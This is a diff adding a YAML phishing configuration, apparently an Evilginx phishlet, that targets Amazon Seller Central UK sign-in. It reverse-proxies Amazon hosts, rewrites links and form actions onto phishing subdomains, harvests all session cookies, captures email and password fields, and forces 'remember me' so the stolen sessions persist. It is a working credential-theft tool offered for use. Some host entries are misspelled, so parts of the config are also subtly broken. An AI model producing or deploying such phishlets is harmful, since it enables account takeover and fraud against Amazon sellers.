@@ -1,0 +1,56 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'sellercentral', orig_sub: 'sellercentral', domain: 'amazon.co.uk', session: true, is_landing: true}
+  - {phish_sub: 'fls-eu', orig_sub: 'fls-eu', domain: 'amazon.com', session: false, is_landing: false}
+  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: false, is_landing: false}
+
+sub_filters:
+
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'sellercentral', domain: 'amazon.co.uk', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'sellercentral', domain: 'amazon.co.uk', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'sellercentral', domain: 'amazon.co.uk', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'fls-eu', domain: 'amazon.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'fls-eu', domain: 'amazon.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'fls-eu', domain: 'amazon.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'images-na', domain: 'amazon.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'images-na', domain: 'amazon.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'images-na', domain: 'amazon.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'sellercentral', domain: 'amazon.co.uk', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'sellercentral.amazon.co.uk', orig_sub: 'sellercentral', domain: 'amazon.co.uk', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-eu.amazon.com', orig_sub: 'fls-eu', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-eu.amazon.com', orig_sub: 'fls-eu', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-iges-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: '.amazon.co.uk'
+    keys: ['.*,regexp']
+  - domain: '.amazon.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/'
+  - '/*'
+  
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/ap/signin'
+    search:
+      - {key: 'email', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'rememberMe', value: 'true'}
+    type: 'post'
+    
+login:
+  domain: 'sellercentral.amazon.co.uk'
+  path: '/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'
